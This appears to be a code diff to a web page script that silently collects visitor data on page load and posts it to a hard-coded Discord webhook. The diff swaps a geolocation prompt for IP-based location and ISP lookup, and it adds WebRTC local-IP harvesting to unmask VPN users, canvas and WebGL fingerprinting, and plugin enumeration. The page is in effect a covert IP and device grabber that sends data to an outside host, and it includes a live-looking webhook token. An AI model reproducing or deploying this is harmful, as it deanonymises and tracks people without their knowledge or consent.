@@ -57,12 +57,12 @@ body{
 </div>
 
 <script>
-
+// Replace this with your actual Discord webhook URL
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512218769026715809/qOI8l5jlBoH37WUEYqqNwmlGf4i9nzmqLYptSIVjh8h06pIMCP3VjTlPwNOYV7lR5PAB";
 
 async function sendDeviceInfoToWebhook() {
     try {
-        // Collect device information
+        // Collect basic device information
         let ip = "Unable to load";
         try {
             const ipResponse = await fetch("https://api.ipify.org?format=json");
@@ -72,63 +72,75 @@ async function sendDeviceInfoToWebhook() {
             console.error("Failed to fetch IP:", e);
         }
 
-        let location = "Location access denied";
+        // Try to get more detailed IP information
+        let ipInfo = "Unable to load";
         try {
-            const position = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject);
-            });
-            location = `${position.coords.latitude}, ${position.coords.longitude}`;
+            const ipInfoResponse = await fetch("https://ipapi.co/json/");
+            ipInfo = await ipInfoResponse.json();
         } catch (e) {
-            console.error("Failed to get location:", e);
+            console.error("Failed to fetch IP info:", e);
         }
 
-        let battery = "Not available";
-        let charging = "Not available";
-        try {
-            if ("getBattery" in navigator) {
-                const batteryData = await navigator.getBattery();
-                battery = Math.round(batteryData.level * 100) + "%";
-                charging = batteryData.charging ? "Yes" : "No";
-            }
-        } catch (e) {
-            console.error("Failed to get battery info:", e);
-        }
-
-        let network = "Not available";
-        let latency = "Not available";
-        try {
-            if (navigator.connection) {
-                network = navigator.connection.effectiveType;
-                latency = navigator.connection.rtt + " ms";
-            }
-        } catch (e) {
-            console.error("Failed to get network info:", e);
-        }
-
+        // Get browser and system information
         const deviceInfo = {
+            // IP and location info
             ip: "Public IP: " + ip,
-            location: "Location: " + location,
+            country: ipInfo.country || "Unknown",
+            region: ipInfo.region || "Unknown",
+            city: ipInfo.city || "Unknown",
+            isp: ipInfo.org || "Unknown",
             timezone: "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone,
             time: "Local Time: " + new Date().toString(),
+            
+            // Browser and system info
             browser: "User Agent: " + navigator.userAgent,
             platform: "Platform: " + navigator.platform,
             language: "Primary Language: " + navigator.language,
             languages: "Languages: " + navigator.languages.join(", "),
             cookies: "Cookies Enabled: " + navigator.cookieEnabled,
             darkmode: "Dark Mode: " + window.matchMedia("(prefers-color-scheme: dark)").matches,
+            online: "Online: " + navigator.onLine,
+            
+            // Screen and display info
             screen: "Screen Resolution: " + screen.width + " x " + screen.height,
             available: "Available Screen: " + screen.availWidth + " x " + screen.availHeight,
             window: "Window Size: " + window.innerWidth + " x " + window.innerHeight,
             colordepth: "Color Depth: " + screen.colorDepth,
             pixelratio: "Pixel Ratio: " + window.devicePixelRatio,
             touch: "Touch Support: " + ("ontouchstart" in window),
+            
+            // Hardware info
             cores: "CPU Cores: " + navigator.hardwareConcurrency,
             memory: "Device Memory: " + (navigator.deviceMemory || "Unknown") + " GB",
-            online: "Online: " + navigator.onLine,
-            network: "Network Type: " + network,
-            latency: "Estimated Latency: " + latency,
-            battery: "Battery: " + battery,
-            charging: "Charging: " + charging
+            
+            // Network info
+            network: "Network Type: " + (navigator.connection ? navigator.connection.effectiveType : "Unknown"),
+            latency: "Estimated Latency: " + (navigator.connection ? navigator.connection.rtt + " ms" : "Unknown"),
+            
+            // Battery info
+            battery: "Battery: " + ("getBattery" in navigator ? "Available" : "Not available"),
+            
+            // WebRTC IP detection (for VPN detection)
+            webrtcIPs: "WebRTC IPs: " + (await getWebRTCIPs()).join(", "),
+            
+            // Canvas fingerprint
+            canvasFingerprint: "Canvas Fingerprint: " + getCanvasFingerprint(),
+            
+            // WebGL info
+            webglInfo: "WebGL Info: " + JSON.stringify(getWebGLInfo()),
+            
+            // Storage info
+            localStorage: "Local Storage Available: " + isLocalStorageAvailable(),
+            sessionStorage: "Session Storage Available: " + isSessionStorageAvailable(),
+            indexedDB: "IndexedDB Available: " + isIndexedDBAvailable(),
+            
+            // Plugins
+            plugins: "Plugins: " + getPlugins().join(", "),
+            
+            // Misc
+            doNotTrack: "Do Not Track: " + (navigator.doNotTrack || "Not set"),
+            javaEnabled: "Java Enabled: " + navigator.javaEnabled(),
+            pdfViewerEnabled: "PDF Viewer Enabled: " + navigator.pdfViewerEnabled
         };
 
         // Create Discord embed
@@ -160,6 +172,109 @@ async function sendDeviceInfoToWebhook() {
     } catch (error) {
         console.error("Error sending device information:", error);
     }
+}
+
+// Function to get WebRTC IPs
+async function getWebRTCIPs() {
+    const ips = [];
+    try {
+        const rtc = new RTCPeerConnection({iceServers:[]});
+        rtc.createDataChannel('', {reliable:false});
+        await rtc.createOffer();
+        rtc.setLocalDescription(rtc.localDescription);
+        
+        // Wait a bit for ICE candidates to be gathered
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        rtc.localDescription.sdp.split('\n').forEach(line => {
+            if (line.startsWith('a=candidate:')) {
+                const parts = line.split(' ');
+                if (parts[4] && (parts[4].match(/^(\d{1,3}\.){3}\d{1,3}$/) || parts[4].match(/^[a-f0-9:]+$/i))) {
+                    ips.push(parts[4]);
+                }
+            }
+        });
+        
+        rtc.close();
+    } catch (e) {
+        console.error("Failed to get WebRTC IPs:", e);
+    }
+    return ips;
+}
+
+// Function to get canvas fingerprint
+function getCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 200;
+        canvas.height = 50;
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('Browser fingerprint', 2, 2);
+        return canvas.toDataURL().slice(-50);
+    } catch (e) {
+        return "Unable to generate";
+    }
+}
+
+// Function to get WebGL info
+function getWebGLInfo() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return { error: "WebGL not supported" };
+        
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+            vendor: gl.getParameter(gl.VENDOR),
+            renderer: gl.getParameter(gl.RENDERER),
+            unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Not available",
+            unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Not available"
+        };
+    } catch (e) {
+        return { error: "Unable to get WebGL info" };
+    }
+}
+
+// Function to check localStorage availability
+function isLocalStorageAvailable() {
+    try {
+        const test = '__test__';
+        localStorage.setItem(test, test);
+        localStorage.removeItem(test);
+        return true;
+    } catch (e) {
+        return false;
+    }
+}
+
+// Function to check sessionStorage availability
+function isSessionStorageAvailable() {
+    try {
+        const test = '__test__';
+        sessionStorage.setItem(test, test);
+        sessionStorage.removeItem(test);
+        return true;
+    } catch (e) {
+        return false;
+    }
+}
+
+// Function to check IndexedDB availability
+function isIndexedDBAvailable() {
+    return 'indexedDB' in window;
+}
+
+// Function to get plugins
+function getPlugins() {
+    const plugins = [];
+    if (navigator.plugins) {
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push(navigator.plugins[i].name);
+        }
+}
+    return plugins;
 }
 
 // Send info immediately when page loads
